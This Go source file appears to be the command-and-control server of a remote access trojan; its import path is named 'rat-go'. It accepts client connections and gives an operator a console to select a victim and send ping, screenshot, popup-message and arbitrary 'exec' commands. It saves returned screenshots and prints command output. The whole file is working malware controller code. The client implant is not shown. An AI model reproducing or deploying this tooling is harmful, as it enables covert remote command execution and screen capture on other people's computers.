package main

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/golang/snappy"
	"github.com/google/uuid"
	"github.com/joetifa2003/rat-go/pkg/models"
)

type Connection struct {
	Conn    net.Conn
	Encoder *gob.Encoder
	Decoder *gob.Decoder
}

func NewConnection(conn net.Conn) Connection {
	return Connection{
		Conn:    conn,
		Encoder: gob.NewEncoder(snappy.NewWriter(conn)),
		Decoder: gob.NewDecoder(snappy.NewReader(conn)),
	}
}

type TCPServer struct {
	Connections []Connection
	connLock    sync.Mutex
}

func NewTcpServer() TCPServer {
	return TCPServer{}
}

func (s *TCPServer) Start() {
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		listner, err := net.Listen("tcp", "localhost:9777")
		if err != nil {
			panic(err)
		}
		defer listner.Close()

		for {
			conn, err := listner.Accept()
			if err != nil {
				panic(err)
			}
			log.Printf("%s connected\n", conn.RemoteAddr())

			s.connLock.Lock()
			s.Connections = append(s.Connections, NewConnection(conn))
			s.connLock.Unlock()
		}
	}()

	var selectedConn Connection
	scanner := bufio.NewScanner(os.Stdin)
	scanning := true
	for scanning {
		fmt.Print("> ")
		scanning = scanner.Scan()
		command := strings.Split(scanner.Text(), " ")
		commandText := strings.Join(command[1:], " ")

		if command[0] == "select" {
			idx, _ := strconv.Atoi(command[1])
			s.connLock.Lock()
			selectedConn = s.Connections[idx]
			s.connLock.Unlock()
			fmt.Println("Selected connection:", selectedConn.Conn.RemoteAddr())
			continue
		}

		if selectedConn.Conn == nil {
			fmt.Println("Please select a connection")
			continue
		}

		switch command[0] {
		case "ping":
			err := selectedConn.Encoder.Encode(models.Message{Type: models.MessagePing})
			if err != nil {
				panic(err)
			}

			var msg models.Message
			err = selectedConn.Decoder.Decode(&msg)
			if err != nil {
				panic(err)
			}

			fmt.Println(string(msg.PingResponse))
		case "screenshot":
			err := selectedConn.Encoder.Encode(models.Message{Type: models.MessageScreenShot})
			if err != nil {
				panic(err)
			}

			var msg models.Message
			err = selectedConn.Decoder.Decode(&msg)
			if err != nil {
				panic(err)
			}

			f, err := os.Create(fmt.Sprintf("screenshot-%s-%s.jpeg", selectedConn.Conn.RemoteAddr(), uuid.New().String()))
			if err != nil {
				panic(err)
			}
			_, err = f.Write(msg.ScreenShotResponse)
			if err != nil {
				panic(err)
			}
			f.Close()
		case "msg":
			err := selectedConn.Encoder.Encode(models.Message{Type: models.MessageMsg, MsgRequest: commandText})
			if err != nil {
				panic(err)
			}
		case "exec":
			err := selectedConn.Encoder.Encode(models.Message{Type: models.MessageExec, ExecRequest: commandText})
			if err != nil {
				panic(err)
			}

			var msg models.Message
			err = selectedConn.Decoder.Decode(&msg)
			if err != nil {
				panic(err)
			}

			fmt.Println(msg.ExecResponse)
		}
	}

	wg.Wait()
}

func main() {
	server := NewTcpServer()
	server.Start()
}
